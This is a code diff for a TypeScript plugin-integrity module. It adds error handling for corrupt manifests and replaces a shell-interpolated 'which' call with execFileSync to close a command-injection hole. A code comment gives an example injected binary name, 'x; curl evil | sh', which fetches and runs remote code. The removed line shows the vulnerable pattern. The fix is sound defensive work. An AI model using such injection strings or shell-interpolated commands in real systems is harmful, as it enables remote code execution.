@@ -1,4 +1,4 @@
-import { execSync } from "node:child_process";
+import { execSync, execFileSync } from "node:child_process";
 import fs from "node:fs";
 import path from "node:path";
 import crypto from "node:crypto";
@@ -57,7 +57,14 @@ export function verifyPluginIntegrity(pluginDir: string): PluginIntegrityResult 
     return { valid: false, expected: "", actual: "manifest not found" };
   }
 
-  const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf-8"));
+  let manifest: { checksum?: string };
+  try {
+    manifest = JSON.parse(fs.readFileSync(manifestPath, "utf-8"));
+  } catch {
+    // A corrupt manifest must not abort verification of the other plugins —
+    // treat it as a failed check for this one.
+    return { valid: false, expected: "", actual: "invalid manifest.json" };
+  }
   const expected: string = manifest.checksum ?? "";
   if (!expected) {
     return { valid: false, expected: "", actual: "no checksum in manifest" };
@@ -105,7 +112,13 @@ export function checkToolchainBinaries(toolchain: ToolchainConfig): ToolchainBin
 
   for (const binary of binaries) {
     try {
-      const resolvedPath = execSync(`which ${binary} 2>/dev/null`, { encoding: "utf-8" }).trim();
+      // execFileSync (no shell): a binary name from project config like
+      // "x; curl evil | sh" is passed as a single argument to `which`, which
+      // simply reports it as not found rather than executing it.
+      const resolvedPath = execFileSync("which", [binary], {
+        encoding: "utf-8",
+        stdio: ["ignore", "pipe", "ignore"],
+      }).trim();
       if (resolvedPath && fs.existsSync(resolvedPath)) {
         const hash = crypto
           .createHash("sha256")
